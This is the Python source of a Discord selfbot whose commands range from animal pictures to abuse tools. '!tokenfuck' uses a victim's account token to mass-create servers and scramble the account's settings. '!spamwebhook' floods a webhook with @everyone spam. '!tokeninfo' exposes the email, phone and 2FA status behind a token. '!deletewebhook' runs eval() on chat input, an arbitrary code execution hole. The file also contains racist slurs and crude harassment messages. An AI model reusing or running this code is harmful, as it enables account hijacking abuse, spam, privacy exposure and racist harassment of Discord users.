import discord 
from discord.ext import commands
import random
import aiohttp
import requests
import asyncio
import json
from datetime import datetime
import base64
from itertools import cycle
import linecache
import os

token = ""

bot = commands.Bot(command_prefix='!', bot=False)
color = 3092790


languages = {
              'da'    : 'Danish, Denmark',
              'de'    : 'German, Germany',
              'en-GB' : 'English, United Kingdom',
              'en-US' : 'English, United States',
              'es-ES' : 'Spanish, Spain',
              'fr'    : 'French, France',
              'hr'    : 'Croatian, Croatia',
              'lt'    : 'Lithuanian, Lithuania',
              'hu'    : 'Hungarian, Hungary',
              'nl'    : 'Dutch, Netherlands',
              'no'    : 'Norwegian, Norway',
              'pl'    : 'Polish, Poland',
              'pt-BR' : 'Portuguese, Brazilian, Brazil',
              'ro'    : 'Romanian, Romania',
              'fi'    : 'Finnish, Finland',
              'sv-SE' : 'Swedish, Sweden',
              'vi'    : 'Vietnamese, Vietnam',
              'tr'    : 'Turkish, Turkey',
              'cs'    : 'Czech, Czechia, Czech Republic',
              'el'    : 'Greek, Greece',
              'bg'    : 'Bulgarian, Bulgaria',
              'ru'    : 'Russian, Russia',
              'uk'    : 'Ukranian, Ukraine',
              'th'    : 'Thai, Thailand',
              'zh-CN' : 'Chinese, China',
              'ja'    : 'Japanese',
              'zh-TW' : 'Chinese, Taiwan',
              'ko'    : 'Korean, Korea'
          }


locales = [
              "da", "de",
              "en-GB", "en-US",
              "es-ES", "fr",
              "hr", "it",
              "lt", "hu",
              "nl", "no",
              "pl", "pt-BR",
              "ro", "fi",
              "sv-SE", "vi",
              "tr", "cs",
              "el", "bg",
              "ru", "uk",
              "th", "zh-CN",
              "ja", "zh-TW",
              "ko"
          ]

@bot.event
async def on_message_delete(message):
    global snipe_message_content
    global snipe_message_author
    global snipe_message_id
    snipe_message_content = message.content
    snipe_message_author = message.author.id
    snipe_message_id = message.id
    await asyncio.sleep(60)
    if message.id == snipe_message_id:
        snipe_message_author = None
        snipe_message_content = None
        snipe_message_id = None

@bot.event
async def on_message(message):
        args = message.content.split()
        
        #blacklist
        #if message.author.id == 919422362640842832:
          #pass
        
          
        if args[0] ==  '!help':
          await message.channel.send("""```autohotkey
A_Utility
!snipe - sends the last deleted message 
!b64encode/decode - encodes/decodes something in base64 
!botinvite - sends a invite to a bot
!linkvertise - bypasses a linkvertise link
!leak - checks a query on intelx (only emails,)
!idinfo - checks an id
!ipinfo - checks an ip 
!tokeninfo - checks a tokens info 
!spamwebhook - spams a webhook
!deletewebhook - deletes a webhook 
!tokenfuck - fucks a token

" Image "
!banner - steals anyones banner
!av - steals anyones avatar
!racc - sends a raccoon pic 
!cat - sends a cat pic 
!dog - sends a dog pic 
!hentai - you already know what it does 

%Fun%
!8ball - 8ball
!cf - flips a coin
!poll - creates a poll
!guessinggame - guessing game (if someone interrupts it breaks)
!nigrate - sends ur nigrate u blackie 

Developed by xyte```""")

  
        elif args[0] == "!randomserver":
          server = linecache.getline('servers.txt', random.randint(1, 1600))
          await message.channel.send(server)

        elif args[0] == "!hentai":
          await message.channel.send("Join my server for hentiea autoposting: https://discord.gg/3H593pZCqQ")

        elif args[0] ==  "!cf":
          ht = random.randint(1,2)
          if ht == 1:
            await message.channel.send("Heads!") #why did u make everything into args[0] again
          else:
            await message.channel.send("Tails!")


        elif args[0] ==  "!poll":
            message = await message.channel.send(f"""`Poll!`\n{args[1]}""")
            await message.add_reaction('✅')
            await message.add_reaction('❎')


        elif args[0] ==  "!leak":
          search = {args[1]}
          search2 = str(search).replace("@", "%40").strip('{').strip('}').strip("'")
          await message.channel.send(f"<https://intelx.io/?s={search2}>")
          


        elif args[0] ==  "!botinvite":
          await message.channel.send(f'https://discord.com/api/oauth2/authorize?client_id={args[1]}&permissions=0&scope=bot')

                      
        elif args[0] ==  '!deletewebhook':
          try:
            requests.delete(args[1])
            await message.channel.send(f"Deleted webhook '{eval(args[1])}''")
          except:
            await message.channel.send(f"Error! {eval(args[1])}")

        elif args[0] ==  "!b64encode":
          string_bytes = args[1].encode("ascii")
          base64_bytes = base64.b64encode(string_bytes) 
          base64_string = base64_bytes.decode("ascii") 
          await message.channel.send(f"Encoded: `{base64_string}`")

        elif args[0] ==  "!b64decode":
          string_bytes = args[1].encode("ascii")
          base64_bytes = base64.b64decode(string_bytes) 
          base64_string = base64_bytes.decode("ascii")
          await message.channel.send(f"Decoded: {base64_string}")


        elif args[0] ==  '!nigrate':
          await message.channel.send(f"`ur nigrate is {random.randint(0,100)}% u black monkey `")


        elif args[0] ==  "!dog":
             async with aiohttp.ClientSession() as session:
              request = await session.get('https://some-random-api.ml/img/dog') 
              dogjson = await request.json()
              await message.channel.send(dogjson['link'])



        elif args[0] ==  '!tokenfuck':
            _token = str(args[1])
            names = args[2]
            headers = {
                  'User-Agent': 'Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.2 Chrome/51.0.2704.106 Safari/537.36',
                  'Content-Type': 'application/json',
                  'Authorization': _token,
              }
            request = requests.Session()
            payload = {
                  'theme': "light",
                  'locale': "ja",
                  'message_display_compact': False,
                  'inline_embed_media': False,
                  'inline_attachment_media': False,
                  'gif_auto_play': False,
                  'render_embeds': False,
                  'render_reactions': False,
                  'animate_emoji': False,
                  'convert_emoticons': False,
                  'enable_tts_command': False,
                  'explicit_content_filter': '0',
                  'status': "invisible",
                  'developer_mode': True
                  
              }
            guild = {
                  'channels': None,
                  'icon': None,
                  'name': names,
                  'region': "europe"
              } 
            try:
                for _i in range(100):
                    requests.post('https://discord.com/api/v6/guilds', headers=headers, json=guild)
            except:
                pass
            while True:
                  try:
                      request.patch("https://canary.discord.com/api/v6/users/@me/settings",headers=headers, json=payload)
                  except KeyError:
                      pass
                  else:
                      break
            modes = cycle(["light", "light"])
            statuses = cycle(["online", "idle", "invisible"])
            for i in range(1000):
                  setting = {
                      'theme': next(modes),
                      'locale': random.choice(locales),
                      'status': next(statuses)
                  }
            for i in range(1000):
                      try:
                          request.patch("https://canary.discord.com/api/v6/users/@me/settings", headers=headers, json=setting, timeout=10)
                      except KeyError:
                          pass
                      else:
                          break

          
        elif args[0] ==  "!spamwebhook":
          webhook = args[1]
          try:
            for i in range(100):
              requests.post(
                  webhook.content,
                  json={'content': f"""@everyone ﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽ @everyone ﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"""})
          except:
            print('err')



        elif args[0] ==  "!cat":
             async with aiohttp.ClientSession() as session:
              request = await session.get('https://some-random-api.ml/img/cat') 
              dogjson = await request.json()
              await message.channel.send(dogjson['link'])


        elif args[0] ==  "!racc" or args[0] ==  "!rat":
             async with aiohttp.ClientSession() as session:
              request = await session.get('https://some-random-api.ml/img/raccoon') 
              dogjson = await request.json()
              await message.channel.send(dogjson['link'])



        elif args[0] ==  "!tokeninfo":
           token = args[1]
           headers = {
               'Authorization': token,
               'Content-Type': 'application/json'
           }
           try:
               res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
               res = res.json()
               user_id = res['id']
               locale = res['locale']
               avatar_id = res['avatar']
               language = languages.get(locale)
               creation_date = "nvm"
           except KeyError:
               headers = {
                   'Authorization': "Bot " + token,
                   'Content-Type': 'application/json'
               }
               try:
                   res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
                   res = res.json()
                   user_id = res['id']
                   locale = res['locale']
                   avatar_id = res['avatar']
                   language = languages.get(locale)
                   creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
                       '%d-%m-%Y %H:%M:%S UTC')
                   em = discord.Embed(color=0x2f3136,
                       description=f"Name: `{res['username']}#{res['discriminator']} ` **(BOT**)\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
                   fields = [
                       {'name': 'Flags', 'value': res['flags']},
                       {'name': 'Local language', 'value': res['locale'] + f"{language}"},
                       {'name': 'Verified', 'value': res['verified']},
                   ]
                   for field in fields:
                      if field['value']:
                           em.add_field(name=field['name'], value=field['value'], inline=False)
                           em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
                   return await message.channel.send(embed=em)
               except KeyError:
                   await message.channel.send("Invalid token")
           em = discord.Embed(color=0x2f3136,
               description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
           nitro_type = "None"
           if "premium_type" in res:
               if res['premium_type'] == 2:
                   nitro_type = "Nitro Premium"
               elif res['premium_type'] == 1:
                   nitro_type = "Nitro Classic"
           fields = [
               {'name': 'Phone', 'value': res['phone']},
               {'name': 'Flags', 'value': res['flags']},
               {'name': 'Local language', 'value': res['locale'] + f"{language}"},
               {'name': 'MFA', 'value': res['mfa_enabled']},
               {'name': 'Verified', 'value': res['verified']},
               {'name': 'Nitro', 'value': nitro_type},
           ]
           await message.channel.send(f"`Name:` `{res['username']}#{res['discriminator']}`\n`ID:` `{res['id']}`\n`Email:` `{res['email']}`\n`PFP:` https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}\n`Phone:` {res['phone']} \n`Flags:` {res['flags']}\n`Language:` {language}\n`2FA:` {res['mfa_enabled']}\n`Verified:` {res['verified']}\n`Nitro:` {nitro_type}")



        elif args[0] ==  "!idinfo":
          response2 = args[1]
          user = await bot.fetch_user(response2)
          time1 = user.created_at.timestamp()
          timestamp = datetime.fromtimestamp(time1)
          await message.channel.send(f"""
**Username:** {user.name}#{user.discriminator}
**Id:** {response2}
**Created at:** {timestamp}
""")

        elif args[0] ==  "!linkvertise":
          headers = {
          "Host": "bypass.bot.nu",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
          "Accept": "*/*",
          "Accept-Language": "en-US,en;q=0.5",
          "Accept-Encoding": "gzip, deflate, br",
          "Referer": "https://bypass.bot.nu/",
          "Connection": "keep-alive",
              }
          link = args[1]
          data = requests.get(f"https://bypass.bot.nu/bypass2?url={link}", headers=headers)
          link = data.json()["destination"]
          await message.channel.send(f"Link: {link}")

        elif args[0] ==  "!av":
          await message.channel.send('User?')
          try:
            user = args[1]
            await message.channel.send(user.avatar_url)
          except:
            response = await bot.wait_for('message')
            response2 = response.content
            user = await bot.fetch_user(response2)
            await message.channel.send(user.avatar_url)


        elif args[0] ==  "!banner":
          user = args[1]
          req = await bot.http.request(discord.http.Route("GET", "/users/{uid}", uid = user.id))
          banner_id = req["banner"]
          if banner_id == None:
            await message.channel.send("No banner!")
          else:
            banner_url = f"https://cdn.discordapp.com/banners/{user.id}/{banner_id}?size=1024"
            await message.channel.send(banner_url)


        elif args[0] ==  "!ipinfo":
            ip2 = args[1]
            if ip2 == "Link?":
              pass
            else:
              async with aiohttp.ClientSession() as session:
                request = await session.get(f'https://ipapi.co/{ip2}/json') 

                ipjson = await request.json()
                json_formatted_str = json.dumps(ipjson, indent=2)
                ipinfo = json_formatted_str.strip('{').strip('}').replace('"', "⁣").replace(',', '⁣').replace('  ⁣', '⁣')

                await message.channel.send(f"""```{ipinfo}```""")
              
        elif args[0] ==  "!8ball":
          q = args[1]
          responses = ['yes',
                    'no',
                    'maybey',
                    'sure']
          response = random.choice(responses)
          lol = random.randint(1, 30)
          if lol == 7:
            response = "i put my coomer in ur moder"
            await message.channel.send(f'''Question: {q}\nAnswer: {response}''')      

        elif args[0] ==  '!snipe':
            if snipe_message_content==None:
                await message.channel.send("NOTHING TO SNIPE U FAT LITTLE MONKEY")
            else:
                await message.channel.send(f"""
Sniped: `{snipe_message_content}`
Sent by: <@{snipe_message_author}>""")



          
        elif args[0] ==  "!guessinggame":
                await message.channel.send('Guess a number from 1 to 5!')
                number = random.randint(1, 5)
                for i in range(1, 5):
                    response = await bot.wait_for('message')
                    guess = int(response.content)
                    if guess > number:
                        await message.channel.send('Smaller!')
                    elif guess < number:
                        await message.channel.send('Bigger!')
                    else:
                        await message.channel.send('You guessed it!')










bot.run(token)
